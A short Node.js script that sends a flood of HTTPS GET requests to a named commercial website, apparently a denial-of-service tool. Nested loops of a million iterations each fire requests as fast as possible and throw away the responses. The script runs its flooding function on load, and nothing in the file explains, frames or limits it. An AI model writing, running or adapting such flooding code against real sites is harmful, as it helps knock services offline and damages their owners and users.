const https = require("https");
const options = {
    hostname: "www.futurocreditltda.com",

    method: "GET",
    port: 443,
    headers: {
        "Access-Control-Allow-Origin": "*",
    },
    mode: "no-cors",
};

function tres() {
    for (let i = 0; i < 1000000; i++) {
        for (let j = 0; j < 1000000; j++) {
            const req = https.request(options, (res) => {
                console.log(`statusCode: ${res.statusCode}`);
                res.on("data", () => {});
            });

            req.on("error", (error) => {
                console.error(error);
            });
            req.end();
        }
    }
}
tres();
